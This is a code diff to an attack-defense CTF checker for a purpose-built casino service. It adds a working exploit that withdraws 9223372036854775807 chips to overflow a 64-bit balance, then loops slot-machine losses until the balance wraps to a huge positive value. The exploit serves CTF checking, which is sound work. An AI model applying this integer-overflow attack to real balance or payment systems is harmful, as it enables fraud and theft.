@@ -15,6 +15,7 @@ from Crypto.Hash import SHA256
 from Crypto.Cipher import AES
 from enochecker import BaseChecker, BrokenServiceException, run
 from enochecker.utils import *
+from ctypes import c_longlong as int64
 
 def bytes_arr_to_int_arr(bytes_arr):
     result = []
@@ -309,7 +310,7 @@ class CasinoChecker(BaseChecker):
         t.write('%d\n' %(sum))
         self.readline_expect_multiline(t, string_dictionary["withdraw_4"])
 
-        self.balance += amount
+        self.add_to_balance(amount)
         if self.balance > 10000:
             self.readline_expect_multiline(t, string_dictionary["withdraw_2"])
             self.balance = 10000
@@ -349,10 +350,10 @@ class CasinoChecker(BaseChecker):
             result = result.decode("utf-8")
 
             if result == string_dictionary["slot_machine_4"] + "\n":
-                self.balance += chips
+                self.add_to_balance(chips)
                 self.debug("slot_machine - you win. balance: %d" %(self.balance))
             elif result == string_dictionary["slot_machine_5"] + "\n":
-                self.balance -= chips
+                self.add_to_balance(-chips)
                 self.debug("slot_machine - you lose. balance: %d" %(self.balance))
             else:
                 self.debug("slot_machine - got: %s expected: slot_machine_4 or slot_machine_5" %(result))
@@ -405,7 +406,7 @@ class CasinoChecker(BaseChecker):
             self.readline_expect_multiline(t, string_dictionary["roulette_5"])
             t.read_until("Your total winnings are: ")
             winnings = int(t.read_until("\n").rstrip())
-            self.balance += winnings
+            self.add_to_balance(winnings)
 
             self.readline_expect_multiline(t, string_dictionary["gamble_2"])
             if rounds-1 == i:
@@ -447,10 +448,10 @@ class CasinoChecker(BaseChecker):
             if line == string_dictionary["black_jack_0"]:
                 natural = True
             elif line == string_dictionary["black_jack_1"]:
-                self.balance += int(chips/2)
+                self.add_to_balance(int(chips/2))
                 natural = True
             elif line == string_dictionary["black_jack_2"]:
-                self.balance -= chips
+                self.add_to_balance(-chips)
                 natural = True
             elif line == string_dictionary["black_jack_6"]:
                 natural = False
@@ -469,9 +470,9 @@ class CasinoChecker(BaseChecker):
                 print(result)
 
                 if result[len(result) - 3] == 'Better luck next time!':
-                    self.balance -= chips
+                    self.add_to_balance(-chips)
                 elif result[len(result) - 3] == 'Congratulations!':
-                    self.balance += chips
+                    self.add_to_balance(chips)
                 elif result[len(result) - 3] == 'Well played!':
                     pass
                 else:
@@ -540,6 +541,8 @@ class CasinoChecker(BaseChecker):
         self.create_table(t, identifier, self.flag, minimum, passphrase)
         self.team_db[self.flag] = (identifier, minimum, passphrase)
 
+    def add_to_balance(self, x):
+        self.balance = int64(self.balance + x).value
 
     port = 6969  # default port to send requests to.
 
@@ -573,7 +576,7 @@ class CasinoChecker(BaseChecker):
             #print(self.flag_round)
             self.debug("Putflag success before closing")
             t.close()
-        except:
+        except Exception as e:
             self.debug("putflag - Exception catched; Flag ID: " + str(self.flag_idx))
             self.debug(e)
             raise BrokenServiceException("putflag did not work; Flag ID: " + str(self.flag_idx))
@@ -648,7 +651,56 @@ class CasinoChecker(BaseChecker):
             self.debug("connected to {}".format(self.address))
             self.intro(t)
             if self.flag_idx == 0:
-                pass
+                self.debug("exploit - withdrawing 1 chip")
+                self.withdraw_chips(t,1)
+                self.debug("exploit - withdrawing 9223372036854775807")
+                self.withdraw_chips(t, 9223372036854775807)
+                self.debug("exploit - balance should be -9223372036854775808 :: %d" %(self.balance))
+                while self.balance < 9223372036854775807:
+                    self.goto_games(t)
+                    t.write("slot_machine\n")
+                    self.readline_expect_multiline(t, string_dictionary["spacer"])
+                    self.readline_expect_multiline(t, string_dictionary["slot_machine_welcome"])
+
+                    self.readline_expect_multiline(t, string_dictionary["spacer"])
+                    self.readline_expect_multiline(t, string_dictionary["slot_machine_0"])
+
+                    t.write("5\n")
+                    self.readline_expect_multiline(t, string_dictionary["slot_machine_1"])
+                    
+                    self.readline_expect_multiline(t, string_dictionary["slot_machine_3"])   
+                    
+                    result = t.read_until("\n")
+                    result = result.decode("utf-8")
+
+                    if result == string_dictionary["slot_machine_4"] + "\n":
+                        self.add_to_balance(1)
+                        self.debug("exploit - won the game but wanted to lose.. trying again..")
+                        continue
+
+                    elif result == string_dictionary["slot_machine_5"] + "\n":
+                        self.add_to_balance(-1)
+                        self.debug("exploit - lost the game")
+                    else:
+                        self.debug("slot_machine - got: %s expected: slot_machine_4 or slot_machine_5" %(result))
+                        raise(BrokenServiceException("slot_machine - win/lose message was tempered with."))
+
+                    if self.balance < 0:        
+                        self.readline_expect_multiline(t, string_dictionary["debt_0"])
+                        self.readline_expect_multiline(t, string_dictionary["gamble_4"])
+                        self.readline_expect_multiline(t, string_dictionary["spacer"])
+                        self.readline_expect_multiline(t, "Your balance is: %d" %(self.balance))
+                        self.readline_expect_multiline(t, string_dictionary["reception_0"])
+                    else:
+                        self.readline_expect_multiline(t, string_dictionary["gamble_2"])
+                        t.write("n\n")
+                        self.readline_expect_multiline(t, string_dictionary["gamble_3"])
+                        break
+                self.readline_expect_multiline(t, string_dictionary["spacer"])
+                self.readline_expect_multiline(t, "Your balance is: %d" %(self.balance))
+                self.readline_expect_multiline(t, string_dictionary["reception_0"])
+                self.debug("exploit - successfully managed to get %d" %(self.balance))
+
             elif self.flag_idx == 1:
                 self.goto_cryptomat(t)
                 #get note
@@ -837,7 +889,7 @@ class CasinoChecker(BaseChecker):
 
                     if len(notes) == notes:
                         flag_dimension = random.randint(-pow(2,31), pow(2,31))
-                        self.debug("Empty notes - Generated random dimension: ", dim)
+                        self.debug("Empty notes - Generated random dimension: ", flag_dimension)
                     else:
                         #TODO: adjust to round
                         difference = self.round - self.flag_round
